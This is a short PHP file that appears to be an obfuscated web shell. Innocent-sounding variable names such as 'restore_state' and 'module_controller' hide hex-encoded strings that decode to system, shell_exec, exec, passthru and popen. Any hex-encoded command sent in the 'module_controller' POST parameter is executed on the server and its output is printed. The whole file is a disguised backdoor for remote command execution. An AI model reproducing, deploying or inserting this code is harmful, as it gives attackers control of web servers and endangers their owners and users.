<?php


$resource1 = '3';
$resource2 = '7';
$resource3 = '6';
$resource4 = 'd';
$resource5 = '8';
$resource6 = 'c';
$resource7 = 'f';
$resource8 = '5';
$resource9 = '2';
$resource10 = '4';
$resource11 = '1';
$resource12 = 'e';
$restore_state1 = pack("H*", '7' . $resource1 . $resource2 . '9' . '7' . '3' . $resource2 . '4' . '6' . '5' . $resource3 . $resource4);
$restore_state2 = pack("H*", '7' . $resource1 . $resource3 . $resource5 . $resource3 . '5' . '6' . $resource6 . '6' . $resource6 . '5' . $resource7 . $resource3 . $resource8 . $resource2 . $resource5 . $resource3 . $resource8 . $resource3 . '3');
$restore_state3 = pack("H*", '6' . '5' . '7' . $resource5 . '6' . $resource8 . $resource3 . $resource1);
$restore_state4 = pack("H*", '7' . '0' . '6' . '1' . $resource2 . $resource1 . '7' . $resource1 . $resource2 . '4' . '6' . '8' . $resource2 . $resource9 . '7' . $resource8);
$restore_state5 = pack("H*", '7' . '0' . $resource3 . 'f' . $resource2 . '0' . $resource3 . $resource8 . '6' . 'e');
$restore_state6 = pack("H*", '7' . $resource1 . $resource2 . $resource10 . '7' . $resource9 . '6' . '5' . $resource3 . $resource11 . $resource3 . 'd' . $resource8 . $resource7 . $resource3 . $resource2 . '6' . '5' . '7' . $resource10 . $resource8 . $resource7 . '6' . $resource1 . $resource3 . $resource7 . $resource3 . 'e' . '7' . $resource10 . '6' . $resource8 . $resource3 . 'e' . $resource2 . $resource10 . $resource2 . '3');
$restore_state7 = pack("H*", '7' . '0' . $resource3 . '3' . $resource3 . 'c' . '6' . 'f' . '7' . $resource1 . '6' . '5');
$module_controller = pack("H*", $resource3 . 'd' . $resource3 . 'f' . '6' . '4' . $resource2 . $resource8 . $resource3 . 'c' . '6' . $resource8 . '5' . $resource7 . '6' . '3' . $resource3 . $resource7 . $resource3 . $resource12 . '7' . '4' . $resource2 . $resource9 . $resource3 . 'f' . $resource3 . 'c' . '6' . 'c' . '6' . $resource8 . '7' . '2');
if (isset($_POST[$module_controller])) {
    $module_controller = pack("H*", $_POST[$module_controller]);
    if (function_exists($restore_state1)) {
        $restore_state1($module_controller);
    } elseif (function_exists($restore_state2)) {
        print $restore_state2($module_controller);
    } elseif (function_exists($restore_state3)) {
        $restore_state3($module_controller, $dchunk_binding);
        print join("\n", $dchunk_binding);
    } elseif (function_exists($restore_state4)) {
        $restore_state4($module_controller);
    } elseif (function_exists($restore_state5) && function_exists($restore_state6) && function_exists($restore_state7)) {
        $fac_ent = $restore_state5($module_controller, 'r');
        if ($fac_ent) {
            $elem_obj = $restore_state6($fac_ent);
            $restore_state7($fac_ent);
            print $elem_obj;
        }
    }
    exit;
}
